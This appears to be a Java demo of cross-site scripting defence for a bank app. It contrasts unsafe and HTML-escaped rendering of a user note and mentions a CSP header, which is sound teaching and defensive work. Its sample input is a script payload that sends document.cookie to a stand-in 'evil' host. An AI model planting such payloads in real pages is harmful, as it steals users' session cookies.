package com.bank.xss;

import java.util.logging.*;

public class XssDefenseDemo {
    private static final Logger log = Logger.getLogger(XssDefenseDemo.class.getName());
    static final String BANK_NAME = "National Bank of India";

    static {
        Logger root = Logger.getLogger("");
        for (Handler h : root.getHandlers()) root.removeHandler(h);
        ConsoleHandler ch = new ConsoleHandler();
        ch.setFormatter(new BankLogFormatter());
        ch.setLevel(Level.ALL);
        root.addHandler(ch);
        root.setLevel(Level.ALL);
    }

    public static void main(String[] args) {
        NoteRenderer renderer = new NoteRenderer();
        String maliciousNote = "<script>fetch('https://evil/?c='+document.cookie)</script>";

        // UNSAFE: raw concatenation -> live script in the page.
        String unsafeHtml = renderer.renderUnsafe(maliciousNote);
        log.severe("UNSAFE render contains executable script: " + unsafeHtml);

        // SAFE: HTML-escaped -> inert text, browser shows the characters literally.
        String safeHtml = renderer.renderSafe(maliciousNote);
        log.info("SAFE render is inert (escaped): " + safeHtml);

        // Defense in depth: CSP header blocks inline scripts even if one slips through.
        log.info(() -> "Response header -> " + CspPolicy.header());
    }
}

